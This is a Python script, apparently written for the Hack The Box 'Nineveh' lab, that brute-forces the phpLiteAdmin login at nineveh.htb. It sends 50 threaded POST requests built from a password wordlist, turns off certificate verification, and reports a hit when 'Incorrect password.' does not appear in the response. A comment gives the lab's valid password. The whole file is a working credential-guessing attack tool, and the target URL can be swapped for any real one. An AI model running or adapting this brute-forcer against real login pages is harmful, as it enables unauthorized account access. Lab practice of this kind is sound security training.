#!/usr/bin/python3 

import requests, os, signal
from pwn import log
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from concurrent.futures import ThreadPoolExecutor


requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


def ctrl_c(sig, frame):
    print('\n[!] Exiting...!')
    os._exit(0)

signal.signal(signal.SIGINT, ctrl_c)

# Valid password: password123


def make_request(password):

    progress.status(password)

    payload = {
        'password':password,
        'remember':'yes',
        'login':'Log In',
        'proc_login':'true'
    }

    response = requests.post(url, data=payload, verify=False)

    if 'Incorrect password.' not in response.text: 
        progress.success(password)


if __name__ == '__main__':

    url = 'https://nineveh.htb/db/index.php'
    wordlist = 'passwords.txt'
    progress = log.progress('Password (phpLiteAdmin)')

    with open(wordlist, 'r') as wordlist:

        passwords = [word.rstrip() for word in wordlist]
    
        with ThreadPoolExecutor(max_workers=50) as executor:

            executor.map(make_request, passwords)
                                                    